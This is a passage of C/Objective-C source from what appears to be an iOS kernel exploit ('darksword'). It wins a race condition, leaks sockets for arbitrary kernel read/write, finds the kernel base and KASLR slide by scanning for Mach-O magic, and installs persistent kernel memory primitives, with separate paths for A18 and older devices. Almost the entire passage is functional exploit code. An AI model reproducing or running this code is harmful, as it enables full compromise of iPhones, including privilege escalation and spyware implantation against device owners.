        printf("[-] Couldn't find controlSocketAddr || rwSocketAddr\n");
        FAILURE(0);
    }

    uint64_t controlSocketSoCount = early_kread64(controlSocketAddr + koffsetof(socket, usecount));
    uint64_t rwSocketSoCount = early_kread64(rwSocketAddr + koffsetof(socket, usecount));
    early_kwrite64(controlSocketAddr + koffsetof(socket, usecount), controlSocketSoCount + 0x0000100100001001);
    early_kwrite64(rwSocketAddr + koffsetof(socket, usecount), rwSocketSoCount + 0x0000100100001001);

    early_kwrite64(rwSocketPcb + koffsetof(inpcb, icmp6filt) + 8, 0);
}

uint64_t kernel_base;
uint64_t kernel_slide;

int exploit_init(const char *flavor)
{
    init_globals();
    struct utsname name;
    uname(&name);

    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
        printf("[+] Running on A18 device\n");
        sleep(8);
        pe_init();
        pe_v2();
    }
    else {
        printf("[+] Running on non-A18 device\n");
        pe_init();
        pe_v1();
    }

    printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
    printf("[+] successReadCount: %d\n", successReadCount);

    goSync = 0;
    raceSync = 1;
    pthread_join(freeThread, NULL);
    close(writeFd);
    close(readFd);

    controlSocketPcb = early_kread64(rwSocketPcb + koffsetof(inpcb, list_next));
    krw_sockets_leak_forever();
    
    uint64_t textPtr = 0;
    if (@available(iOS 17.0, *)) {
        uint64_t pcbinfo_pointer = early_kread64(controlSocketPcb + koffsetof(inpcb, pcbinfo));
        //PRINT_VAR(pcbinfo_pointer);
        uint64_t ipi_zone = early_kread64(pcbinfo_pointer + koffsetof(inpcbinfo, ipi_zone));
        //PRINT_VAR(ipi_zone);
        textPtr = early_kread64(ipi_zone + koffsetof(kalloc_type_view, kt_zv_zv_name));
        //PRINT_VAR(textPtr);
    }
    else {
        uint64_t socketPtr = early_kread64(controlSocketPcb + koffsetof(inpcb, socket)); // inpcb->socket
        //PRINT_VAR(socketPtr);
        uint64_t protoPtr = early_kread64(socketPtr + koffsetof(socket, proto)); // socket->so_proto
        //PRINT_VAR(protoPtr);
        textPtr = unpac_ptr(early_kread64(protoPtr + koffsetof(protosw, input))); // protosw->pr_input
        //PRINT_VAR(textPtr);
    }
    
    cpu_subtype_t cpusubtype = 0;
    size_t len = sizeof(cpusubtype);
    sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0);
    bool isArm64e = (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;

    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
    while (true) {
        //PRINT_VAR(kernel_base);
        if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
            uint64_t typeinfo = early_kread64(kernel_base + 8);
            
            if (isArm64e) {
                if (@available(iOS 19.0, *)) {
                    if (typeinfo == 0xcc0000002) break;
                }
                else if (@available(iOS 16.0, *)) {
                    if (typeinfo == 0xc00000002) break;
                }
                else {
                    break;
                }
            }
            else {
                if (typeinfo == 0x200000000) break;
            }
        }
        kernel_base -= PAGE_SIZE;
    }
    kernel_slide = kernel_base - kconstant(staticBase);

    printf("early_kread64(%#llx) -> %#llx\n", kernel_base, early_kread64(kernel_base));

    gPrimitives.kreadbuf = darksword_kreadbuf;
    gPrimitives.kwritebuf = darksword_kwritebuf;
    
    gSystemInfo.kernelConstant.slide = kernel_slide;
    
    if (@available(iOS 16.0, *)) {}
    else {
        darksword_init_iosurface();
        gPrimitives.kreadbuf = darksword_kreadbuf_iosurface;
        gPrimitives.kwritebuf = darksword_kwritebuf_iosurface;
    }

    gPrimitives.krwMinSafeReadSize = 0x20;

    printf("kread64(%#llx) -> %#llx\n", kernel_base, kread64(kernel_base));

    return 0;
}

int exploit_deinit(void)
{
    return 0;
}
